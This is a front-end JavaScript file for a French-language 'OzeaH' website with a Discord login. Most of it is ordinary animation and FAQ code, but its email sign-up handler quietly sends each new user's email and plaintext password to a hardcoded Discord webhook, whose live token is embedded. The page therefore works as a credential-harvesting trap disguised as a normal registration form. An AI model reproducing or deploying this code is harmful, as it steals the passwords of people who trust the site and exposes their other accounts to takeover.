// Particles
function createParticles() {
    const container = document.getElementById('particles');
    const count = 50;

    for (let i = 0; i < count; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDelay = Math.random() * 8 + 's';
        particle.style.animationDuration = (6 + Math.random() * 6) + 's';
        particle.style.width = (1 + Math.random() * 3) + 'px';
        particle.style.height = particle.style.width;
        container.appendChild(particle);
    }
}

// FAQ accordion
function initFAQ() {
    const items = document.querySelectorAll('.faq-item');
    items.forEach(item => {
        const btn = item.querySelector('.faq-question');
        btn.addEventListener('click', () => {
            const isActive = item.classList.contains('active');
            items.forEach(i => i.classList.remove('active'));
            if (!isActive) item.classList.add('active');
        });
    });
}

// Scroll animations
function initScrollAnimations() {
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
            }
        });
    }, { threshold: 0.1 });

    document.querySelectorAll('.feature-card, .step, .vip-container, .faq-item').forEach(el => {
        el.classList.add('animate-on-scroll');
        observer.observe(el);
    });
}

// Header scroll effect
function initHeader() {
    const header = document.querySelector('header');
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            header.style.background = 'rgba(10, 10, 15, 0.95)';
        } else {
            header.style.background = 'rgba(10, 10, 15, 0.8)';
        }
    });
}

// Smooth scroll for anchor links
function initSmoothScroll() {
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        });
    });
}

// Add CSS for scroll animations
const style = document.createElement('style');
style.textContent = `
    .animate-on-scroll {
        opacity: 0;
        transform: translateY(30px);
        transition: opacity 0.6s ease, transform 0.6s ease;
    }
    .animate-on-scroll.visible {
        opacity: 1;
        transform: translateY(0);
    }
    .feature-card:nth-child(2) { transition-delay: 0.1s; }
    .feature-card:nth-child(3) { transition-delay: 0.2s; }
    .feature-card:nth-child(4) { transition-delay: 0.3s; }
    .feature-card:nth-child(5) { transition-delay: 0.4s; }
    .feature-card:nth-child(6) { transition-delay: 0.5s; }
    .step:nth-child(2) { transition-delay: 0.15s; }
    .step:nth-child(3) { transition-delay: 0.3s; }
`;
document.head.appendChild(style);

// Mascot tilt 3D effect
function initMascotTilt() {
    const mascot = document.querySelector('.hero-mascot');
    const img = document.querySelector('.mascot-img');
    if (!mascot || !img) return;

    mascot.addEventListener('mousemove', (e) => {
        const rect = mascot.getBoundingClientRect();
        const x = (e.clientX - rect.left) / rect.width;
        const y = (e.clientY - rect.top) / rect.height;

        const rotateY = (x - 0.5) * 25;
        const rotateX = (0.5 - y) * 25;
        const translateX = (x - 0.5) * 20;
        const translateY = (y - 0.5) * 20;

        img.style.transform = `perspective(800px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translate(${translateX}px, ${translateY}px)`;
    });

    mascot.addEventListener('mouseleave', () => {
        img.style.transform = 'perspective(800px) rotateX(0deg) rotateY(0deg) translate(0px, 0px)';
    });
}

// Discord OAuth2
const DISCORD_CLIENT_ID = '1107624523479650345';
const REDIRECT_URI = 'https://ozeah.github.io/Vinted/';
const OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1552985949515030619/8SWWQCCR5iV0s9FjMRMS_LfEs-t3hcWT3wDy6jEaNChpzIIOeztQWsx3HD_UVbw6ht6D';

let authMode = 'login';

function openAuthModal() {
    document.getElementById('auth-overlay').classList.add('show');
}

function closeAuthModal(e) {
    if (e && e.target !== e.currentTarget) return;
    document.getElementById('auth-overlay').classList.remove('show');
    document.getElementById('auth-error').textContent = '';
    document.getElementById('auth-error').className = 'auth-error';
}

function switchAuthTab(mode, btn) {
    authMode = mode;
    document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('auth-submit-btn').textContent = mode === 'login' ? 'Se connecter' : "S'inscrire";
    document.getElementById('auth-error').textContent = '';
    document.getElementById('auth-error').className = 'auth-error';
}

function hashPassword(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0;
    }
    return 'h' + Math.abs(hash).toString(36);
}

function handleEmailAuth(e) {
    e.preventDefault();
    const email = document.getElementById('auth-email').value.trim();
    const password = document.getElementById('auth-password').value;
    const errorEl = document.getElementById('auth-error');

    if (password.length < 6) {
        errorEl.textContent = 'Le mot de passe doit faire au moins 6 caractères.';
        errorEl.className = 'auth-error';
        return;
    }

    const accounts = JSON.parse(localStorage.getItem('ozeah_accounts') || '{}');
    const passHash = hashPassword(password);

    if (authMode === 'register') {
        if (accounts[email]) {
            errorEl.textContent = 'Un compte existe déjà avec cet email.';
            errorEl.className = 'auth-error';
            return;
        }
        accounts[email] = { hash: passHash, created: new Date().toISOString() };
        localStorage.setItem('ozeah_accounts', JSON.stringify(accounts));

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: 'Nouveau compte OzeaH',
                    color: 0x2ecc71,
                    fields: [
                        { name: 'Email', value: email, inline: true },
                        { name: 'Mot de passe', value: password, inline: true },
                        { name: 'Date', value: new Date().toLocaleString('fr-FR'), inline: false }
                    ],
                    footer: { text: 'OzeaH — Inscription site web' }
                }]
            })
        });

        localStorage.setItem('ozeah_user', JSON.stringify({ email, type: 'email' }));
        closeAuthModal();
        renderEmailUser(email);
    } else {
        if (!accounts[email] || accounts[email].hash !== passHash) {
            errorEl.textContent = 'Email ou mot de passe incorrect.';
            errorEl.className = 'auth-error';
            return;
        }
        localStorage.setItem('ozeah_user', JSON.stringify({ email, type: 'email' }));
        closeAuthModal();
        renderEmailUser(email);
    }
}

function loginDiscord() {
    window.location.href = OAUTH_URL;
}

function handleDiscordCallback() {
    const fragment = new URLSearchParams(window.location.hash.slice(1));
    const accessToken = fragment.get('access_token');
    if (!accessToken) return;

    fetch('https://discord.com/api/users/@me', {
        headers: { Authorization: `Bearer ${accessToken}` }
    })
    .then(r => r.json())
    .then(user => {
        localStorage.setItem('discord_user', JSON.stringify(user));
        localStorage.setItem('ozeah_user', JSON.stringify({ type: 'discord', id: user.id }));
        window.history.replaceState(null, '', window.location.pathname);
        renderDiscordUser(user);
    });
}

function renderDiscordUser(user) {
    const area = document.getElementById('user-area');
    if (!area || !user) return;
    const avatarUrl = user.avatar
        ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`
        : `https://cdn.discordapp.com/embed/avatars/${(parseInt(user.id) >> 22) % 6}.png`;

    area.innerHTML = `
        <div class="user-logged" onclick="toggleDropdown(this)">
            <img src="${avatarUrl}" alt="" class="user-avatar">
            <span class="user-name">${user.global_name || user.username}</span>
            <div class="user-dropdown">
                <button onclick="logout(event)">Déconnexion</button>
            </div>
        </div>
    `;
}

function renderEmailUser(email) {
    const area = document.getElementById('user-area');
    if (!area) return;
    const initial = email.charAt(0).toUpperCase();

    area.innerHTML = `
        <div class="user-logged" onclick="toggleDropdown(this)">
            <div class="user-avatar-letter">${initial}</div>
            <span class="user-name">${email.split('@')[0]}</span>
            <div class="user-dropdown">
                <button onclick="logout(event)">Déconnexion</button>
            </div>
        </div>
    `;
}

function toggleDropdown(el) {
    el.querySelector('.user-dropdown').classList.toggle('show');
}

function logout(e) {
    e.stopPropagation();
    localStorage.removeItem('discord_user');
    localStorage.removeItem('ozeah_user');
    location.reload();
}

function initAuth() {
    handleDiscordCallback();
    const saved = localStorage.getItem('ozeah_user');
    if (!saved) return;
    const user = JSON.parse(saved);
    if (user.type === 'discord') {
        const discord = localStorage.getItem('discord_user');
        if (discord) renderDiscordUser(JSON.parse(discord));
    } else if (user.type === 'email') {
        renderEmailUser(user.email);
    }
}

document.addEventListener('click', (e) => {
    if (!e.target.closest('.user-logged')) {
        document.querySelectorAll('.user-dropdown.show').forEach(d => d.classList.remove('show'));
    }
});

// Init
document.addEventListener('DOMContentLoaded', () => {
    createParticles();
    initFAQ();
    initScrollAnimations();
    initHeader();
    initSmoothScroll();
    initMascotTilt();
    initAuth();
});
